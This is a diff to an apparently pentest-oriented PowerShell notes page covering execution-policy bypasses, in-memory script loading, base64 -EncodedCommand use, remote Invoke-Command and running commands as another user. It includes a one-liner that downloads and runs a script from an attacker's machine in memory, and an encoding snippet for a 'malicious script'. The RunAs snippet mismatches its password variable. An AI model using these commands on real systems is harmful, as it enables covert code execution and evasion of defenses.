@@ -18,17 +18,18 @@ Always ensure you have **explicit** permission to access any computer system **b
 | `Echo <script_code> \| PowerShell.exe -noprofile -`                                                                                                                                     | Similar to simply pasting the code.                                                                                                                                                                                      |
 | `cat $script.ps1 \| PowerShell.exe -noprofile -`                                                                                                                                        | Effectively the same as the previous example, but the code is read from a script file instead of being pasted. `cat` is an alias for `Get-Content`.                                                                      |
 | `function <name> { <code_here> }`                                                                                                                                                       | Similar to the above examples, however you paste your code inside the curly braces, and run the code by typing the `<name>` of your function. Allows for **code reuse without having to copy and paste multiple times.** |
-| `PowerShell.exe -command "<code_here>"`                                                                                                                                                 | Runs the string provided to the `-c` (Command) argument as code.                                                                                                                                                         |
+| `PowerShell.exe -command "<code_here>"`                                                                                                                                                 | Runs the string provided to the `-c` (Command) argument as code. If the value of the `-Command` parameter is `-`, the command text is read from standard input.                                                          |
 | `cat $script.ps1 \| IEX`                                                                                                                                                                | Pipes the content of the script to the `Invoke-Expression` cmdlet, which runs any specified string as a command and returns the results to the console. `IEX` is an alias for `Invoke-Expression`.                       |
 | `IEX { <code_here> }`                                                                                                                                                                   | Essentially creates a one-time use function from your code.                                                                                                                                                              |
 | `& { <code_here> }`                                                                                                                                                                     | The operator (`&`) is an alias for `Invoke-Expression` and is equivalent to the example above.                                                                                                                           |
 | `. { <code_here> }`                                                                                                                                                                     | The operator (`.`) can be used to create an anonymous one-time function. This can sometimes be used to bypass certain constrained language modes.                                                                        |
-| <p><code>$text = Get-Content $text_file -Raw</code></p><p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code></p><p></p><p><code>&#x26; $script</code></p> | Using the .NET object `System.Management.Automation.ScriptBlock` we can compile and text content to a script block. Then, using (`&`) we can easily execute this compiled and formatted text file.                       |
+| `Invoke-Command -scriptblock { <code_here> } -ComputerName $Computer`                                                                                                                   | Can be used to run commands against remote systems with the optional `-ComputerName` parameter if PowerShell remoting has been enabled.                                                                                  |
+| <p><code>$text = Get-Content $text_file -Raw</code></p><p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code></p><p></p><p><code>&#x26; $script</code></p> | Using the .NET object `System.Management.Automation.ScriptBlock` we can compile any text content to a script block. Then, using (`&`) we can easily execute this compiled and formatted text file.                       |
 | `Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) \| PowerShell -NoProfile -`                                                                          | Download script from attacker's machine, then run in PowerShell, in memory. No files are written to disk.                                                                                                                |
 
 #### Other Bypass Methods
 
-**Execute .ps1 scripts on compromised machine: in memory and other bypass methods**
+**Execute .ps1 scripts in memory**
 
 If you are able to use `Invoke-Expression` (`IEX`) you can execute remote scripts using the following command. You can also copy and paste the functions into your PowerShell session, so any functions become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory.
 
@@ -93,6 +94,17 @@ function $function_name {
 
 Then you can re-use the code by just typing the function name.
 
+**Using the -EncodedCommand parameter**
+
+This is very similar to using the `-c` or `-Command` parameter, however, in this case all scripts are passed as a base64 encoded string.  Encoding your script in this way helps to avoid all of the annoying parsing errors that you encounter when using the standard `-Command` parameter. This technique does not require any configuration changes or disk writes. &#x20;
+
+```powershell
+$command = "Get-Content $malicious_script"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
+$encodedCommand = [Convert]::ToBase64String($bytes) 
+powershell.exe -EncodedCommand $encodedCommand
+```
+
 ### Sudo for Windows
 
 There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`. It is not as simple to use as `sudo`, however.
@@ -113,12 +125,12 @@ Use the below PowerShell script to run commands as another user.
 
 ```powershell
 $secPassword = ConvertTo-SecureString "$password" -AsPlainText -Force
-$myCreds = New-Object System.Management.Automation.PSCredential ("$userName", $secpasswd)
+$myCreds = New-Object System.Management.Automation.PSCredential("$userName", $secpasswd)
 
 [System.Diagnostics.Process]::Start("$command", $myCreds.Username, $myCreds.Password, $computerName)
 ```
 
-Needs a `password`, `username`, `command`, and `computername` specified in this example, which runs `$command` as the specified user.
+Needs the `password`, `username`, `command`, and `computername` parameters in this example, which runs `$command` as the specified user.
 
 ## PowerShell `sudo` script
 
